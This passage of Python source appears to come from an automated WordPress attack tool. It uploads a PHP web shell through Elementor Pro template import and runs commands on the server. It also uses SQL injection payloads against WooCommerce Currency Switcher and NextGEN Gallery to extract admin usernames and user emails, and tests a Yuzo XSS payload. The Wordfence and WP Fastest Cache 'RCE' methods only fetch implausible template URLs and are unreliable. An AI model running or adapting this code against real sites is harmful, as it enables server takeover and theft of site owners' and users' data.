        """Exploit Elementor Pro RCE Vulnerability"""
        result = {
            'vulnerability': vuln.get('title', 'Elementor Pro RCE'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:
            # Step 1: Check if Elementor is installed
            elementor_url = f"{self.target}/wp-content/plugins/elementor/"
            response = self.session.get(elementor_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'Elementor plugin not found'
                return result
            
            # Step 2: Check for Elementor Pro
            elementor_pro_url = f"{self.target}/wp-content/plugins/elementor-pro/"
            response = self.session.get(elementor_pro_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                result['status'] = 'failed'
                result['reason'] = 'Elementor Pro plugin not found'
                return result
                

            
            # Step 3: Create a malicious template with PHP code
            payload_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            

            php_shell = '''<?php
if(isset($_GET["cmd"])) {
    echo "<pre>";
    $cmd = ($_GET["cmd"]);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<form action="" method="GET">
<input type="text" name="cmd" size="50" value="<?php echo isset($_GET["cmd"]) ? htmlspecialchars($_GET["cmd"]) : ""; ?>">
<input type="submit" value="Execute">
</form>

<h2>Elementor Shell</h2>
<p>Server: <?php echo php_uname(); ?></p>
<p>Current Directory: <?php echo getcwd(); ?></p>
'''
            

            template_json = {
                "version": "0.4",
                "title": "Template",
                "type": "page",
                "content": [
                    {
                        "id": "malicious_section",
                        "settings": {
                            "_title": "Malicious Section",
                            "html": php_shell
                        },
                        "elements": [],
                        "isInner": False,
                        "elType": "section"
                    }
                ],
                "page_settings": {
                    "template": "elementor_canvas"
                }
            }
            

            template_buffer = io.BytesIO()
            with zipfile.ZipFile(template_buffer, 'w', zipfile.ZIP_DEFLATED) as template_zip:

                template_zip.writestr('manifest.json', json.dumps({"name": "Malicious Template"}))
                template_zip.writestr('templates/template.json', json.dumps(template_json))
                

                template_zip.writestr(f'templates/{payload_name}.php', php_shell)
            
            template_buffer.seek(0)
            

            upload_url = f"{self.target}/wp-admin/admin-ajax.php"
            

            files = {
                'file': (f'template_import_{payload_name}.zip', template_buffer.getvalue(), 'application/zip')
            }
            
            form_data = {
                'action': 'elementor_library_direct_actions',
                'library_action': 'import_template',
                '_nonce': 'elementor_ajax',  # We try without valid nonce first
            }
            
            response = self.session.post(upload_url, data=form_data, files=files, headers=self.headers, timeout=self.timeout, verify=False)
            

            upload_success = False
            shell_path = None
            
            try:
                response_data = response.json()
                if response_data.get('success') or 'Template imported' in str(response_data):
                    upload_success = True

            except:
                # If the response is not JSON, it could still mean the upload worked
                pass
            

            if not upload_success:

                form_data['source'] = 'direct'
                form_data['template_url'] = 'local'
                

                site_cookies = self.session.cookies.get_dict()
                if site_cookies:
                    self.headers['Cookie'] = '; '.join([f"{k}={v}" for k, v in site_cookies.items()])
                
                response = self.session.post(upload_url, data=form_data, files=files, headers=self.headers, timeout=self.timeout, verify=False)
                
                try:
                    response_data = response.json()
                    if response_data.get('success') or 'Template imported' in str(response_data):
                        upload_success = True

                except:
                    pass
            

            potential_paths = [
                f"{self.target}/wp-content/uploads/elementor/templates/{payload_name}.php",
                f"{self.target}/wp-content/uploads/elementor/{payload_name}.php",
                f"{self.target}/wp-content/uploads/elementor/tmp/{payload_name}.php",
                f"{self.target}/wp-content/uploads/template-library/{payload_name}.php"
            ]
            
            shell_found = False
            
            for path in potential_paths:
                try:
                    shell_check = self.session.get(path, headers=self.headers, timeout=self.timeout, verify=False)
                    if shell_check.status_code == 200 and "Elementor Shell" in shell_check.text:
                        shell_found = True
                        shell_path = path
                        break
                except Exception:
                    continue
            

            if shell_found and shell_path:

                test_cmd = "echo ELEMENTOR_RCE_SUCCESSFUL"
                test_url = f"{shell_path}?cmd={test_cmd}"
                
                try:
                    cmd_response = self.session.get(test_url, headers=self.headers, timeout=self.timeout, verify=False)
                    if "ELEMENTOR_RCE_SUCCESSFUL" in cmd_response.text:
                        result['status'] = 'success'
                        result['data']['shell_url'] = shell_path
                        result['data']['command_execution'] = True
                        result['details'] = f"Successfully uploaded shell via Elementor template import. Shell available at {shell_path}"
                        

                        server_info_cmd = "uname -a && id && pwd"
                        info_url = f"{shell_path}?cmd={server_info_cmd}"
                        info_response = self.session.get(info_url, headers=self.headers, timeout=self.timeout, verify=False)
                        
                        if info_response.status_code == 200:

                            server_info = re.search(r'<pre>(.*?)</pre>', info_response.text, re.DOTALL)
                            if server_info:
                                result['data']['server_info'] = server_info.group(1).strip()
                    else:
                        result['status'] = 'partial'
                        result['data']['shell_url'] = shell_path
                        result['data']['command_execution'] = False
                        result['details'] = f"Shell uploaded but command execution failed"
                except Exception as e:
                    result['status'] = 'partial'
                    result['data']['shell_url'] = shell_path
                    result['data']['command_execution'] = False
                    result['details'] = f"Shell uploaded but error during command execution: {str(e)}"
            else:
    
                if upload_success:
                    result['status'] = 'partial'
                    result['reason'] = 'Template upload successful but shell not found'
                    result['data']['potential_paths'] = potential_paths
                else:
                    result['status'] = 'failed'
                    result['reason'] = 'Failed to upload template'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result

    def _exploit_wordfence_rce(self, vuln):
        """Exploit Wordfence RCE Vulnerability"""
        result = {
            'vulnerability': vuln.get('title', 'Wordfence RCE'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:

            template_id = vuln.get('additional_info', {}).get('template_id')
            
            if not template_id:
                result['status'] = 'failed'
                result['reason'] = 'Missing template ID'
                return result
            

            response = self.session.get(f"{self.target}/wordfence/template/{template_id}", headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                result['status'] = 'success'
                result['data']['template_content'] = response.text
                result['details'] = f"Successfully accessed Wordfence template: {template_id}"
            else:
                result['status'] = 'failed'
                result['reason'] = f"Failed to access Wordfence template. Status code: {response.status_code}"
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result

    def _exploit_wp_fastest_cache_rce(self, vuln):
        """Exploit WP Fastest Cache RCE vulnerability"""
        result = {
            'vulnerability': vuln.get('title', 'WP Fastest Cache - Unauthenticated RCE'),
            'status': 'unknown',
            'type': 'Remote Code Execution',
            'data': {}
        }
        
        try:

            template_id = vuln.get('additional_info', {}).get('template_id')
            
            if not template_id:
                result['status'] = 'failed'
                result['reason'] = 'Missing template ID'
                return result
            

            response = self.session.get(f"{self.target}/wp-fastest-cache/template/{template_id}", headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code == 200:
                result['status'] = 'success'
                result['data']['template_content'] = response.text
                result['details'] = f"Successfully accessed WP Fastest Cache template: {template_id}"
            else:
                result['status'] = 'failed'
                result['reason'] = f"Failed to access WP Fastest Cache template. Status code: {response.status_code}"
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result

    def _exploit_woocommerce_currency_switcher(self, vuln):
        """Exploit WooCommerce Currency Switcher SQL Injection (CVE-2023-23992)"""
        result = {
            'vulnerability': vuln.get('title', 'WooCommerce Currency Switcher SQL Injection'),
            'status': 'unknown',
            'type': 'SQL Injection',
            'data': {}
        }
        
        try:

            if not self._is_woocommerce_active():
                result['status'] = 'failed'
                result['reason'] = 'WooCommerce not detected on this site'
                return result
                

            currency_switcher_urls = [
                f"{self.target}/wp-content/plugins/woocommerce-currency-switcher/",
                f"{self.target}/wp-content/plugins/woocommerce-aelia-currencyswitcher/"
            ]
            
            plugin_found = False
            for url in currency_switcher_urls:
                try:
                    response = self.session.get(url, headers=self.headers, timeout=self.timeout, verify=False)
                    if response.status_code == 200:
                        plugin_found = True
                        break
                except Exception:
                    continue
            
            if not plugin_found:
                # Try checking HTML content for indicators
                try:
                    home_response = self.session.get(self.target, headers=self.headers, timeout=self.timeout, verify=False)
                    if 'currency-switcher' not in home_response.text.lower() and 'woocs' not in home_response.text.lower():
                        result['status'] = 'failed'
                        result['reason'] = 'WooCommerce Currency Switcher plugin not found'
                        return result
                except Exception:
                    result['status'] = 'failed'
                    result['reason'] = 'WooCommerce Currency Switcher plugin not found'
                    return result
            

            

            sqli_test_urls = [
                f"{self.target}/?woocs_shortcode=1&shortcode_name=woocs_converter&flag_mode=1'",
                f"{self.target}/?woocs_shortcode=1&shortcode_name=woocs_dropdown&flag_mode=1'",
                f"{self.target}/?woocs_shortcode=1&shortcode_name=woocs&flag_mode=1'"
            ]
            
            vulnerable_url = None
            for test_url in sqli_test_urls:
                try:
                    response = self.session.get(test_url, headers=self.headers, timeout=self.timeout, verify=False)
                    # Check for SQL error in response
                    if response.status_code == 500 or 'database error' in response.text.lower() or 'sql syntax' in response.text.lower():
                        vulnerable_url = test_url
                        break
                except Exception:
                    continue
            
            if not vulnerable_url:
                result['status'] = 'failed'
                result['reason'] = 'Site not vulnerable to WooCommerce Currency Switcher SQL Injection'
                return result
            

            url_base = vulnerable_url.split("'")[0]
            db_prefix_payload = url_base + "'+(SELECT IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%options' LIMIT 1),1,1)='w',SLEEP(3),0))-- -"
            
            start_time = time.time()
            response = self.session.get(db_prefix_payload, headers=self.headers, timeout=max(self.timeout, 10), verify=False)
            end_time = time.time()
            

            if (end_time - start_time) > 2.5:
                result['status'] = 'success'
                result['details'] = "Site is vulnerable to SQL Injection in WooCommerce Currency Switcher"
                result['data']['vulnerable_url'] = vulnerable_url
                

                extracted_data = {}
                

                url_base = vulnerable_url.split("'")[0]
                db_name_payload = url_base + "'UNION SELECT CONCAT('DB:',database())-- -"
                try:
                    response = self.session.get(db_name_payload, headers=self.headers, timeout=self.timeout, verify=False)
                    db_name_match = re.search(r'DB:([^<>"\']+)', response.text)
                    if db_name_match:
                        extracted_data['database_name'] = db_name_match.group(1)
                except Exception:
                    pass
                

                url_base = vulnerable_url.split("'")[0]
                prefix_payload = url_base + "'UNION SELECT CONCAT('PFX:',table_name) FROM information_schema.tables WHERE table_name LIKE '%options' LIMIT 1-- -"
                try:
                    response = self.session.get(prefix_payload, headers=self.headers, timeout=self.timeout, verify=False)
                    prefix_match = re.search(r'PFX:([^<>"\']+)', response.text)
                    if prefix_match:
                        table_name = prefix_match.group(1)
                        extracted_data['wordpress_prefix'] = table_name.replace('options', '')
                except Exception:
                    pass
                

                if 'wordpress_prefix' in extracted_data:
                    prefix = extracted_data['wordpress_prefix']
                    url_base = vulnerable_url.split("'")[0]
                    admin_payload = url_base + "'UNION SELECT CONCAT('ADM:',user_login) FROM " + prefix + "users WHERE ID=1-- -"
                    try:
                        response = self.session.get(admin_payload, headers=self.headers, timeout=self.timeout, verify=False)
                        admin_match = re.search(r'ADM:([^<>"\']+)', response.text)
                        if admin_match:
                            extracted_data['admin_username'] = admin_match.group(1)
                    except Exception:
                        pass
                
                if extracted_data:
                    result['data']['extracted_info'] = extracted_data
                    with open(os.path.join(self.exploits_dir, 'woocs_sqli_data.json'), 'w') as f:
                        json.dump(extracted_data, f, indent=4)
            else:
                result['status'] = 'failed'
                result['reason'] = 'SQL injection test failed (no time delay observed)'
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
        
    def _exploit_yuzo_related_posts(self, vuln):
        """Exploit Yuzo Related Posts Stored XSS Vulnerability (CVE-2019-9911)"""
        result = {
            'vulnerability': vuln.get('title', 'Yuzo Related Posts Stored XSS'),
            'status': 'unknown',
            'type': 'Cross-Site Scripting',
            'data': {}
        }
        
        try:

            yuzo_url = f"{self.target}/wp-content/plugins/yuzo-related-post/"
            response = self.session.get(yuzo_url, headers=self.headers, timeout=self.timeout, verify=False)
            
            if response.status_code != 200:
                # Try alternative path
                yuzo_url = f"{self.target}/wp-content/plugins/yuzo-related-posts/"
                response = self.session.get(yuzo_url, headers=self.headers, timeout=self.timeout, verify=False)
                
                if response.status_code != 200:
                    result['status'] = 'failed'
                    result['reason'] = 'Yuzo Related Posts plugin not found'
                    return result
            

            settings_url = f"{self.target}/wp-admin/options-general.php?page=yuzo-related-post"
            try:
                response = self.session.get(settings_url, headers=self.headers, timeout=self.timeout, verify=False)
                if response.status_code == 200 and 'yuzo_related_post' in response.text:
                    result['data']['settings_accessible'] = True
                else:
                    result['data']['settings_accessible'] = False
            except Exception:
                result['data']['settings_accessible'] = False
            

            version_check_urls = [
                f"{self.target}/wp-content/plugins/yuzo-related-post/assets/css/style.css",
                f"{self.target}/wp-content/plugins/yuzo-related-posts/assets/css/style.css",
                f"{self.target}/wp-content/plugins/yuzo-related-post/assets/js/yuzo-postviews.js",
                f"{self.target}/wp-content/plugins/yuzo-related-posts/assets/js/yuzo-postviews.js"
            ]
            
            vulnerable_version = False
            for url in version_check_urls:
                try:
                    response = self.session.get(url, headers=self.headers, timeout=self.timeout, verify=False)
                    if response.status_code == 200:

                        version_match = re.search(r'Version:\s*(\d+\.\d+(?:\.\d+)?)', response.text)
                        if version_match:
                            version = version_match.group(1)
                            if self._is_version_vulnerable(version, "<=5.5.8"):
                                vulnerable_version = True
                                result['data']['plugin_version'] = version
                                break
                except Exception:
                    continue
            

            xss_payload = '<script>console.log("Yuzo_XSS_Vulnerable");</script>'
            

            xss_test_url = f"{self.target}/?yuzo_related_post_css={xss_payload}"
            

            try:
                response = self.session.get(xss_test_url, headers=self.headers, timeout=self.timeout, verify=False)
                
                if response.status_code == 200 and xss_payload in response.text:
                    result['status'] = 'success'
                    result['details'] = f"Site is vulnerable to Yuzo Related Posts Stored XSS (CVE-2019-9911)"
                    result['data']['xss_url'] = xss_test_url
                    

                    with open(os.path.join(self.exploits_dir, 'yuzo_xss_report.html'), 'w') as f:
                        f.write("<html><head><title>Yuzo Related Posts XSS Vulnerability Report</title></head><body>")
                        f.write("<h1>Yuzo Related Posts XSS Vulnerability (CVE-2019-9911)</h1>")
                        f.write(f"<p><strong>Target:</strong> {self.target}</p>")
                        f.write(f"<p><strong>Plugin Version:</strong> {result['data'].get('plugin_version', 'Unknown')}</p>")
                        f.write("<p><strong>Vulnerability Description:</strong> The Yuzo Related Posts plugin contains a stored XSS vulnerability that allows attackers to inject malicious JavaScript.</p>")
                        f.write("<h2>Proof of Concept</h2>")
                        f.write(f"<p>The following URL can be used to test the vulnerability: <a href='{xss_test_url}'>{xss_test_url}</a></p>")
                        f.write("<h2>Exploitation Impact</h2>")
                        f.write("<p>This vulnerability could allow attackers to:")
                        f.write("<ul>")
                        f.write("<li>Steal admin cookies and credentials</li>")
                        f.write("<li>Redirect users to malicious websites</li>")
                        f.write("<li>Perform actions on behalf of authenticated users</li>")
                        f.write("<li>Modify the website content</li>")
                        f.write("</ul></p>")
                        f.write("<h2>Remediation</h2>")
                        f.write("<p>It is recommended to update to the latest version of the plugin or remove it if it's no longer maintained.</p>")
                        f.write("</body></html>")

                    result['status'] = 'partial'
                    result['details'] = f"Site likely vulnerable to Yuzo Related Posts Stored XSS (plugin version {result['data'].get('plugin_version', 'unknown')} <= 5.5.8)"
                    result['data']['xss_url'] = xss_test_url
                else:
                    result['status'] = 'failed'
                    result['reason'] = 'Site not vulnerable to Yuzo Related Posts Stored XSS'
            except Exception as e:
                if vulnerable_version:
                    result['status'] = 'partial'
                    result['details'] = f"Plugin version {result['data'].get('plugin_version', 'unknown')} is vulnerable but XSS test failed: {str(e)}"
                else:
                    result['status'] = 'failed'
                    result['reason'] = f"Error testing XSS vulnerability: {str(e)}"
                
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result
    
    def _is_version_vulnerable(self, current_version, version_constraint):
        """Helper method to check if a version is vulnerable based on a constraint"""
        if not current_version:
            return False
            
        if version_constraint.startswith('<='):
            target_version = version_constraint[2:]
            # Compare versions
            current_parts = [int(x) for x in current_version.split('.')]
            target_parts = [int(x) for x in target_version.split('.')]
            
            # Pad with zeros if needed
            while len(current_parts) < len(target_parts):
                current_parts.append(0)
            while len(target_parts) < len(current_parts):
                target_parts.append(0)
                
            # Compare each part
            for i in range(len(current_parts)):
                if current_parts[i] < target_parts[i]:
                    return True
                elif current_parts[i] > target_parts[i]:
                    return False
                    
            # If we get here, versions are equal
            return True
        elif version_constraint.startswith('<'):
            target_version = version_constraint[1:]
            # Compare versions
            current_parts = [int(x) for x in current_version.split('.')]
            target_parts = [int(x) for x in target_version.split('.')]
            
            # Pad with zeros if needed
            while len(current_parts) < len(target_parts):
                current_parts.append(0)
            while len(target_parts) < len(current_parts):
                target_parts.append(0)
                
            # Compare each part
            for i in range(len(current_parts)):
                if current_parts[i] < target_parts[i]:
                    return True
                elif current_parts[i] > target_parts[i]:
                    return False
                    
            # If we get here, versions are equal
            return False
        
        return False
    
    def _exploit_nextgen_gallery_sqli(self, vuln):
        """Exploit NextGEN Gallery SQL Injection Vulnerability (CVE-2021-34107)"""
        result = {
            'vulnerability': vuln.get('title', 'NextGEN Gallery SQL Injection'),
            'status': 'unknown',
            'type': 'SQL Injection',
            'data': {}
        }
        
        try:

            nextgen_urls = [
                f"{self.target}/wp-content/plugins/nextgen-gallery/",
                f"{self.target}/wp-content/plugins/nextgen-gallery-pro/"
            ]
            
            plugin_found = False
            for url in nextgen_urls:
                try:
                    response = self.session.get(url, headers=self.headers, timeout=self.timeout, verify=False)
                    if response.status_code == 200:
                        plugin_found = True
                        break
                except Exception:
                    continue
            
            if not plugin_found:
                # Try checking HTML content for indicators
                try:
                    home_response = self.session.get(self.target, headers=self.headers, timeout=self.timeout, verify=False)
                    if ('nextgen' not in home_response.text.lower() and 
                        'ngg_' not in home_response.text.lower() and
                        'nggallery' not in home_response.text.lower()):
                        result['status'] = 'failed'
                        result['reason'] = 'NextGEN Gallery plugin not found'
                        return result
                except Exception:
                    result['status'] = 'failed'
                    result['reason'] = 'NextGEN Gallery plugin not found'
                    return result
            

            

            gallery_paths = [
                f"{self.target}/gallery/",
                f"{self.target}/galleries/",
                f"{self.target}/photos/",
                f"{self.target}/albums/"
            ]
            
            gallery_page = None
            for path in gallery_paths:
                try:
                    response = self.session.get(path, headers=self.headers, timeout=self.timeout, verify=False)
                    if response.status_code == 200 and ('nextgen' in response.text.lower() or 'ngg_' in response.text.lower()):
                        gallery_page = path
                        break
                except Exception:
                    continue
            

            if not gallery_page:
                try:
                    posts_url = f"{self.target}/wp-json/wp/v2/posts?per_page=5"
                    response = self.session.get(posts_url, headers=self.headers, timeout=self.timeout, verify=False)
                    
                    if response.status_code == 200:
                        posts = response.json()
                        for post in posts:
                            if 'content' in post and 'rendered' in post['content']:
                                content = post['content']['rendered']
                                if '[ngg' in content or 'nextgen' in content.lower():
                                    if 'link' in post:
                                        gallery_page = post['link']
                                        break
                except Exception:
                    pass
            

            if not gallery_page:
                gallery_page = self.target
            

            test_payloads = [
                f"{gallery_page}?galleryid=1'",
                f"{gallery_page}?galleryid=1' --",
                f"{gallery_page}?nggid=1'",
                f"{gallery_page}?album=1&gallery=1'"
            ]
            
            vulnerable = False
            for payload in test_payloads:
                try:
                    response = self.session.get(payload, headers=self.headers, timeout=self.timeout, verify=False)
        
                    if response.status_code == 500 or any(err in response.text.lower() for err in ['sql syntax', 'database error', 'mysql error']):
                        vulnerable = True
                        result['data']['payload_url'] = payload
                        break
                except Exception:
                    continue
            
            if not vulnerable:
    
                time_payload = f"{gallery_page}?galleryid=1' AND (SELECT SLEEP(5))--"
                try:
                    start_time = time.time()
                    response = self.session.get(time_payload, headers=self.headers, timeout=max(self.timeout, 10), verify=False)
                    end_time = time.time()
                    
                    if (end_time - start_time) > 4.5:
                        vulnerable = True
                        result['data']['payload_url'] = time_payload
                except Exception:
                    pass
            
            if not vulnerable:
                result['status'] = 'failed'
                result['reason'] = 'NextGEN Gallery does not appear to be vulnerable to SQL injection'
                return result
            

            prefix_payload = f"{gallery_page}?galleryid=1' UNION SELECT 1,concat('PFX:',table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_name LIKE '%options' LIMIT 1-- -"
            
            try:
                response = self.session.get(prefix_payload, headers=self.headers, timeout=self.timeout, verify=False)
                prefix_match = re.search(r'PFX:([^<>"\']+)', response.text)
                
                extracted_data = {}
                if prefix_match:
                    table_name = prefix_match.group(1)
                    extracted_data['wordpress_prefix'] = table_name.replace('options', '')
                    db_prefix = extracted_data['wordpress_prefix']
                    

                    site_info_payload = f"{gallery_page}?galleryid=1' UNION SELECT 1,concat('INFO:',option_name,':',option_value),3,4,5,6,7 FROM {db_prefix}options WHERE option_name IN ('siteurl','blogname','admin_email') -- -"
                    
                    try:
                        response = self.session.get(site_info_payload, headers=self.headers, timeout=self.timeout, verify=False)
                        info_matches = re.findall(r'INFO:([^:]+):([^<>"\']+)', response.text)
                        
                        for match in info_matches:
                            option_name, option_value = match
                            extracted_data[option_name] = option_value
                    except Exception:
                        pass
                    

                    user_payload = f"{gallery_page}?galleryid=1' UNION SELECT 1,concat('USER:',ID,':',user_login,':',user_email),3,4,5,6,7 FROM {db_prefix}users ORDER BY ID -- -"
                    
                    try:
                        response = self.session.get(user_payload, headers=self.headers, timeout=self.timeout, verify=False)
                        user_matches = re.findall(r'USER:(\d+):([^:]+):([^<>"\']+)', response.text)
                        
                        if user_matches:
                            extracted_data['users'] = []
                            for user_match in user_matches:
                                user_id, username, email = user_match
                                extracted_data['users'].append({
                                    'id': user_id,
                                    'username': username,
                                    'email': email
                                })
                    except Exception:
                        pass
                
                if extracted_data:
                    result['status'] = 'success'
                    result['details'] = "Successfully exploited NextGEN Gallery SQL Injection vulnerability"
                    result['data']['extracted_info'] = extracted_data
                    

                    with open(os.path.join(self.exploits_dir, 'nextgen_gallery_sqli.json'), 'w') as f:
                        json.dump(extracted_data, f, indent=4)
                else:
                    result['status'] = 'partial'
                    result['details'] = "SQL Injection confirmed but data extraction failed"
            except Exception as e:
                if vulnerable:
                    result['status'] = 'partial'
                    result['details'] = f"SQL Injection vulnerability confirmed but error during data extraction: {str(e)}"
                else:
                    result['status'] = 'failed'
                    result['reason'] = f"Error testing SQL injection: {str(e)}"
        except Exception as e:
            result['status'] = 'error'
            result['reason'] = str(e)
        
        return result